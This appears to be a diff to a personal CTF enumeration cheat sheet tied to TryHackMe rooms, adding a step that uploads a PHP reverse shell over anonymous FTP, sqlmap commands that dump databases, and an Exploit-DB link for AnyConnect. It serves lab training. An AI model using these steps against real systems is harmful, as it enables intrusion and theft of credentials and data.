@@ -1,6 +1,6 @@
 # Enumeration
 
-## **Stopped at** VulnNet: Internal
+## **Stopped at** Blog
 
 ## **Scans**
 
@@ -111,19 +111,14 @@ wget -m ftp://anonymous:anonymous@$VICTIM:21 -nd
 
 ### Upload files
 
-Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).
+If there is also a website being hosted and you can see the try adding a webshell and going to it from the browser.
 
 **Kali(ftp)**
 
 ```
 binary
 passive
-```
-
-**Kali(ftp)**
-
-```
-put file.txt
+put php-reverse-shell.php
 ```
 
 
@@ -265,27 +260,23 @@ dirsearch -u $VICTIM:$PORT
 
 ### SQLMap
 
-#### Crack Login
+#### Get information
+
+Can be used to get things like usernames and passwords or other information in the tables.
 
 **Example**
 
-[#sql](../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")
+[#sql](../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")[expose.md](../walkthroughs/tryhackme/expose.md "mention")
 
 **Kali**
 
 ```
 sqlmap -u http://$VICTIM/$PAGE.php --forms --dump
+OR
+sqlmap -r request.txt --dbms=mysql --dump #Get request from Burp
 ```
 
-#### Get Database info
 
-**Example**
-
-\#ga
-
-
-
-#### Get databases Information
 
 **Get Databases**
 
@@ -850,6 +841,10 @@ $VICTIM:6379> LRANGE "$VALUE" 1 100
 
 
 ## TCP/7070 - AnyConnect
+
+**F**
+
+[annie.md](../walkthroughs/tryhackme/annie.md "mention")
 
 **Exploit:** [https://www.exploit-db.com/raw/49613](https://www.exploit-db.com/raw/49613)
 
